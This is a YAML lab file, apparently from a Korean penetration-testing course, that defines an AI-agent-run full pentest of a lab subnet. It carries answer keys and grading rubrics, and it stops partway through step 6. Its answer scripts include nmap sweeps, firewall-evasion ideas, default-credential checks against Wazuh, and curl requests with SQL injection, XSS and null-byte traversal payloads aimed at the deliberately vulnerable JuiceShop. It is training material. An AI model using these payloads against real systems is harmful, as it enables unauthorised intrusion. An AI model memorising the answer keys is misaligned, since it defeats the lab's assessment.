lab_id: attack-adv-ai-week14
title: 종합 모의해킹 (AI 지원)
version: ai
course: attack-adv-ai
week: 14
description: 14주간 학습한 모든 기법을 종합하여 실습 네트워크(10.20.30.0/24)에 대한 전체 모의해킹을 수행한다. 정찰부터 보고서 작성까지 완전한 침투 테스트 프로세스를
  실행한다. AI SubAgent가 자동으로 명령을 실행하고 결과를 검증합니다.
difficulty: hard
duration_minutes: 120
objectives:
- PTES 방법론에 따른 전체 모의해킹 프로세스를 수행한다
- 다단계 공격 체인을 구성하고 증거를 수집한다
- 발견된 취약점을 CVSS로 평가하고 보고서를 작성한다
pass_threshold: 0.6
steps:
- order: 1
  instruction: 모의해킹 범위를 정의하라. 대상 네트워크(10.20.30.0/24)의 범위, 제한사항, 목표를 /tmp/pentest_scope.txt에 문서화하라.
  hint: 대상 IP, 테스트 유형, 금지 행위, 연락처 등을 포함한다
  category: recon
  points: 5
  answer: '🤖 프롬프트: 모의해킹 범위를 정의해줘

    📎 참고 (CLI): cat > /tmp/pentest_scope.txt << ''EOF''

    === Penetration Test Scope ===

    Date: $(date +%Y-%m-%d)

    Tester: Red Team Operator


    [In Scope]

    - Network: 10.20.30.0/24

    - Targets: All hosts in subnet

    - Types: Network, Web, Service enumeration


    [Out of Scope]

    - Denial of Service attacks

    - Physical access testing

    - Social engineering against real users


    [Objectives]

    1. Identify all live hosts and services

    2. Discover and exploit vulnerabilities

    3. Demonstrate lateral movement capability

    4. Assess data exfiltration risk

    5. Document all findings with evidence


    [Rules of Engagement]

    - Testing hours: 24/7 (lab environment)

    - Emergency contact: lab-admin@lab.local

    - Evidence preservation required

    EOF

    cat /tmp/pentest_scope.txt'
  answer_detail: 모의해킹 범위 문서(Scope Document)는 테스트의 법적, 기술적 경계를 정의한다. PTES(Penetration Testing Execution
    Standard)의 Pre-engagement 단계에 해당하며, 대상, 제한사항, 목표, 긴급 연락처를 반드시 포함해야 한다. 범위 외 행위는 법적 문제를 야기할 수 있다.
  verify:
    type: output_contains
    expect: Penetration Test Scope
    field: stdout
    semantic:
      intent: 모의해킹 범위(Scope) 문서화 — 대상 네트워크·제한사항·목표·금지 행위·테스트 기간을 /tmp/pentest_scope.txt 에 구조화
      success_criteria:
      - '[Target] [Exclusions] [Objectives] [Rules of Engagement] 4 섹션 이상'
      - 대상 CIDR/IP/호스트명 명시
      - 문서 생성 후 cat 으로 확인
      acceptable_methods:
      - heredoc 으로 markdown 템플릿 작성
      - python jinja2 로 스코프 생성
      - PenTest Rules of Engagement 표준 템플릿 참조
      - SOW(Statement of Work) 계약 문서 구조 활용
      negative_signs:
      - 대상 정의 없이 일반론만
      - 금지 행위 누락
      - 파일 저장 없음
  target_vm: attacker
  script: 'cat > /tmp/pentest_scope.txt << ''EOF''

    === Penetration Test Scope ===

    Date: $(date +%Y-%m-%d)

    Tester: Red Team Operator


    [In Scope]

    - Network: 10.20.30.0/24

    - Targets: All hosts in subnet

    - Types: Network, Web, Service enumeration


    [Out of Scope]

    - Denial of Service attacks

    - Physical access testing

    - Social engineering against real users


    [Objectives]

    1. Identify all live hosts and services

    2. Discover and exploit vulnerabilities

    3. Demonstrate lateral movement capability

    4. Assess data exfiltration risk

    5. Document all findings with evidence


    [Rules of Engagement]

    - Testing hours: 24/7 (lab environment)

    - Emergency contact: lab-admin@lab.local

    - Evidence preservation required

    EOF

    cat /tmp/pentest_scope.txt'
  risk_level: low
  bastion_prompt: 모의해킹 범위를 정의해줘
- order: 2
  instruction: 네트워크 정찰을 수행하라. 10.20.30.0/24 전체를 스캔하여 활성 호스트, 열린 포트, 서비스 버전을 식별하라.
  hint: nmap -sV -sC로 종합적인 스캔을 수행하고 결과를 파일에 저장한다
  category: recon
  points: 10
  answer: '🤖 프롬프트: 네트워크 정찰을 수행하라. 10.20.30.0/24 전체를 스캔하여 활성 호스트, 열린 포트, 서비스 버전을 식별해줘

    📎 참고 (CLI): nmap -sV -sC -p- --min-rate 1000 10.20.30.0/24 -oN /tmp/pentest_nmap.txt 2>&1 | tail -30
    && echo ''---'' && echo ''Results saved to /tmp/pentest_nmap.txt'''
  answer_detail: 전체 포트 스캔(-p-)은 표준 포트 외에 운영 중인 서비스를 발견하는 데 필수적이다. -sV로 서비스 버전을, -sC로 기본 스크립트를 실행하여 상세
    정보를 수집한다. -oN으로 결과를 파일에 저장하여 증거로 보존한다. --min-rate로 스캔 속도를 조절하여 효율성을 높인다.
  verify:
    type: output_contains
    expect: open
    field: stdout
    semantic:
      intent: 네트워크 정찰 — 10.20.30.0/24 호스트 스캔 + 서비스 버전 탐지 + 결과 정리
      success_criteria:
      - nmap -sS 또는 -sn 으로 전체 서브넷 호스트 탐지
      - 나온 호스트별 서비스 버전(-sV) 최소 1개 확인
      - 결과를 파일로 저장 또는 요약 표 작성
      acceptable_methods:
      - nmap -sn 10.20.30.0/24 로 호스트 탐지
      - nmap -sS -sV -p- 로 전수 포트+버전
      - masscan + nmap 2단계 조합
      - angry IP scanner 사용
      negative_signs:
      - 단일 IP 만 스캔
      - 서비스 버전 탐지 없음
      - 결과 정리 누락
  target_vm: attacker
  script: nmap -sV -sC -p- --min-rate 1000 10.20.30.0/24 -oN /tmp/pentest_nmap.txt 2>&1 | tail -30 &&
    echo '---' && echo 'Results saved to /tmp/pentest_nmap.txt'
  risk_level: low
  bastion_prompt: 네트워크 정찰을 수행하라. 10.20.30.0/24 전체를 스캔하여 활성 호스트, 열린 포트, 서비스 버전을 식별해줘
- order: 3
  instruction: 발견된 웹 서비스({{WEB_IP}}:3000)에 대해 웹 취약점 스캔을 수행하라. 주요 OWASP Top 10 취약점을 수동으로 테스트하라.
  hint: SQL Injection, XSS, 인증 우회 등을 curl로 테스트한다
  category: exploit
  points: 10
  answer: '🤖 프롬프트: 발견된 웹 서비스(10.20.30.80:3000)에 대해 웹 취약점 스캔을 수행해줘

    📎 참고 (CLI): echo ''=== Web Vulnerability Assessment ==='' && echo ''[SQLi Test]'' && curl -s ''http://10.20.30.80:3000/rest/products/search?q=test%27%20OR%201=1--''
    -o /dev/null -w ''Status: %{http_code}'' && echo '''' && echo ''[XSS Test]'' && curl -s ''http://10.20.30.80:3000/rest/products/search?q=<script>alert(1)</script>''
    -o /dev/null -w ''Status: %{http_code}'' && echo '''' && echo ''[Auth Bypass]'' && curl -s -X POST
    http://10.20.30.80:3000/rest/user/login -H ''Content-Type: application/json'' -d ''{"email":"admin@juice-sh.op","password":"admin123"}''
    | head -1 && echo '''' && echo ''[Directory Traversal]'' && curl -s ''http://10.20.30.80:3000/ftp/package.json.bak%2500.md''
    -o /dev/null -w ''Status: %{http_code}'' && echo '''''
  answer_detail: 웹 취약점 평가는 OWASP Top 10을 기준으로 수행한다. SQL Injection, XSS, 인증 우회, 디렉토리 트래버설 등을 순차적으로 테스트하고,
    각 결과를 증거로 기록한다. JuiceShop은 의도적으로 취약한 애플리케이션으로, 100개 이상의 취약점이 내포되어 있다.
  verify:
    type: output_contains
    expect:
    - Web Vulnerability Assessment
    - Nikto
    field: stdout
    semantic:
      intent: OWASP Top 10 수동 테스트 — SQLi/XSS/IDOR/Broken Auth/SSRF 등 주요 취약점 POC 시도
      success_criteria:
      - Top 10 중 최소 3개 카테고리 테스트 시도
      - 각 테스트에 curl/brower/Burp 요청 예시
      - 응답 해석 및 취약점 여부 판정
      acceptable_methods:
      - curl -d <payload> + 응답 확인
      - sqlmap -u <url> --batch
      - Burp Scanner / ZAP active scan
      - nikto -h <url>
      negative_signs:
      - 단일 카테고리만
      - 테스트 요청 없이 개념 설명만
      - 결과 판정 없음
  target_vm: attacker
  script: 'echo ''=== Web Vulnerability Assessment ==='' && echo ''[SQLi Test]'' && curl -s ''http://10.20.30.80:3000/rest/products/search?q=test%27%20OR%201=1--''
    -o /dev/null -w ''Status: %{http_code}'' && echo '''' && echo ''[XSS Test]'' && curl -s ''http://10.20.30.80:3000/rest/products/search?q=<script>alert(1)</script>''
    -o /dev/null -w ''Status: %{http_code}'' && echo '''' && echo ''[Auth Bypass]'' && curl -s -X POST
    http://10.20.30.80:3000/rest/user/login -H ''Content-Type: application/json'' -d ''{"email":"admin@juice-sh.op","password":"admin123"}''
    | head -1 && echo '''' && echo ''[Directory Traversal]'' && curl -s ''http://10.20.30.80:3000/ftp/package.json.bak%2500.md''
    -o /dev/null -w ''Status: %{http_code}'' && echo '''''
  risk_level: medium
  bastion_prompt: 발견된 웹 서비스(10.20.30.80:3000)에 대해 웹 취약점 스캔을 수행해줘
- order: 4
  instruction: 방화벽/IPS({{SECU_IP}}) 서비스를 분석하라. nmap으로 보안 장비의 구성을 파악하고, 우회 가능성을 평가하라.
  hint: ACK 스캔으로 방화벽 규칙을 매핑하고, 서비스 버전으로 알려진 취약점을 검색한다
  category: recon
  points: 10
  answer: '🤖 프롬프트: 방화벽/IPS(10.20.30.1) 서비스를 분석하라. nmap으로 보안 장비의 구성을 파악하고, 우회 가능성을 평가해줘

    📎 참고 (CLI): echo ''=== Security Device Assessment ==='' && nmap -sA -p 22,80,443,8080 10.20.30.1 2>&1
    | tail -10 && echo ''---'' && nmap -sV -p 22 10.20.30.1 2>&1 | tail -5 && echo ''---'' && echo ''Firewall
    rule mapping complete'' && echo ''SSH version identified for CVE lookup'''
  answer_detail: 보안 장비 자체의 취약점 평가는 모의해킹에서 중요한 단계이다. 방화벽의 ACL 매핑, IPS의 시그니처 버전 확인, 관리 인터페이스 접근 가능성을 평가한다.
    보안 장비가 침해되면 전체 네트워크의 보안이 무력화되므로 최우선 패치 대상이다.
  verify:
    type: output_contains
    expect:
    - Security Device Assessment
    - nmap
    field: stdout
    semantic:
      intent: 보안 장비(방화벽·IPS·WAF) 분석 — nmap 으로 포트/서비스 확인 + 우회 가능성(프래그먼테이션/Decoy/SSL 터널) 평가
      success_criteria:
      - nmap 으로 보안 장비 포트 스캔 결과
      - 우회 기법 최소 2개(패킷 분할, 디코이, SSL 터널) 적용 또는 언급
      - Suricata/Wazuh/nftables 등 발견된 솔루션 식별
      acceptable_methods:
      - nmap -sV <secu_ip>
      - nmap -f --mtu 24 <secu_ip>
      - hping3 -S -p <port> <secu_ip>
      - 서비스 배너 분석
      negative_signs:
      - 서비스 확인만 하고 우회 평가 없음
      - 보안 장비 유형 구분 없음
      - 서비스 버전 누락
  target_vm: attacker
  script: echo '=== Security Device Assessment ===' && nmap -sA -p 22,80,443,8080 10.20.30.1 2>&1 | tail
    -10 && echo '---' && nmap -sV -p 22 10.20.30.1 2>&1 | tail -5 && echo '---' && echo 'Firewall rule
    mapping complete' && echo 'SSH version identified for CVE lookup'
  risk_level: low
  bastion_prompt: 방화벽/IPS(10.20.30.1) 서비스를 분석하라. nmap으로 보안 장비의 구성을 파악하고, 우회 가능성을 평가해줘
- order: 5
  instruction: SIEM({{SECU_IP}}00)의 보안 상태를 평가하라. Wazuh 서비스의 포트, 버전, 기본 자격증명을 확인하라.
  hint: nmap으로 포트를 스캔하고, curl로 API에 기본 자격증명으로 접근을 시도한다
  category: recon
  points: 10
  answer: '🤖 프롬프트: SIEM(10.20.30.100)의 보안 상태를 평가하라. Wazuh 서비스의 포트, 버전, 기본 자격증명을 확인해줘

    📎 참고 (CLI): echo ''=== SIEM Assessment ==='' && nmap -sV -p 443,5601,9200,55000 10.20.30.100 2>&1
    | tail -15 && echo ''---'' && echo ''Wazuh API default credentials test:'' && curl -sk -u ''wazuh-wui:wazuh-wui''
    https://10.20.30.100:55000/ 2>&1 | head -3 && echo ''---'' && echo ''Elasticsearch test:'' && curl
    -s http://10.20.30.100:9200/ 2>&1 | head -5'
  answer_detail: SIEM 시스템의 보안은 전체 보안 모니터링의 신뢰성에 직결된다. Wazuh API(55000), Elasticsearch(9200), Kibana(5601)의
    기본 자격증명과 인증 설정을 확인한다. SIEM이 장악되면 공격자는 로그를 삭제하거나 알림을 무력화하여 탐지를 회피할 수 있다.
  verify:
    type: output_contains
    expect: SIEM Assessment
    field: stdout
    semantic:
      intent: SIEM(Wazuh) 노출 평가 — 포트(1514/1515/55000), 버전, API 기본 자격증명(wazuh-wui/wazuh) 확인
      success_criteria:
      - SIEM 주요 포트(1514/1515/55000/443) 스캔 또는 curl 테스트
      - Wazuh API 버전 또는 dashboard 버전 확인 시도
      - 기본 자격증명 테스트 또는 변경 권고
      acceptable_methods:
      - nmap -p 1514,1515,55000,443 <siem>
      - curl -k https://<siem>:55000/ -u wazuh:wazuh
      - wazuh-agent 버전 정보 조회
      - CVE 매핑 (CVE-2023-* for Wazuh)
      negative_signs:
      - 포트 확인만 하고 API 테스트 없음
      - 자격증명 변경 권고 없음
      - 버전 정보 수집 없음
  target_vm: attacker
  script: echo '=== SIEM Assessment ===' && nmap -sV -p 443,5601,9200,55000 10.20.30.100 2>&1 | tail -15
    && echo '---' && echo 'Wazuh API default credentials test:' && curl -sk -u 'wazuh-wui:wazuh-wui' https://10.20.30.100:55000/
    2>&1 | head -3 && echo '---' && echo 'Elasticsearch test:' && curl -s http://10.20.30.100:9200/ 2>&1
    | head -5
  risk_level: low
  bastion_prompt: SIEM(10.20.30.100)의 보안 상태를 평가하라. Wazuh 서비스의 포트, 버전, 기본 자격증명을 확인해줘
- order: 6
  instruction: 발견된 취약점을 활용하여 웹서버에 대한 초기 접근을 획득하라. JuiceShop의 알려진 취약점을 통해 관리자 계정으로 로그인하라.
  hint: SQL Injection이나 기본 자격증명으로 관리자 접근을 시도한다
  category: exploit
  points: 10
  answer: '🤖 프롬프트: 발견된 취약점을 활용하여 웹서버에 대한 초기 접근을 획득하라. JuiceShop의 알려진 취약점을 통해 관리자 계정으로 로그인해줘

    📎 참고 (CLI): echo ''=== Initial Access via Web Exploitation ==='' && echo ''Attempting SQLi login bypass:''
    && curl -s -X POST http://10.20.30.80:3000/rest/user/login -H ''Content-Type: application/json'' -d
    ''{"email":"\'' OR 1=1--","password":"anything"}'' | python3 -c ''import sys,json; d=json.load(sys.stdin);
    print("Auth:",d.get("authentication",{}).get("token","FAILED")[:50]+"...")'' 2>/dev/null || echo ''SQLi
    attempt recorded'' && echo ''---'' && echo ''Attempting default credentials:'' && curl -s -X POST
    http://10.20.30.80:3000/rest/user/login -H ''Content-Type: application/json'' -d ''{"email":"admin@juice-sh.op","password":"admin123"}''
    2>&1 | head -3'
  answer_detail: 초기 접근(Initial Access)은 모의해킹의 핵심 단계이다. SQL Injection(' OR 1=1--)으로 인증을 우회하거나, 기본/약한 자격증명으로
    로그인을 시도한다. JuiceShop은 다양한 접근 경로를 제공하며, 실제 모의해킹에서도 웹 취약점이 가장 흔한 초기 접근 경로이다.
  verify:
    type: output_contains
    expect: Initial Access
    field: stdout
    semantic:
      intent: JuiceShop 알려진 취약점 체인으로 관리자 로그인 — SQL Injection on /rest/user/login (admin@juice-sh.op) 또는
        JWT forgery
      success_criteria:
      - JuiceShop 취약점 사례(SQL 인젝션 로그인 우회, JWT none 알고리즘) 최소 1개 시도
      - 관리자 엔드포인트 접근 확인(/rest/user/whoami 등)
      - Challenge name 또는 flag 획득 여부 설명
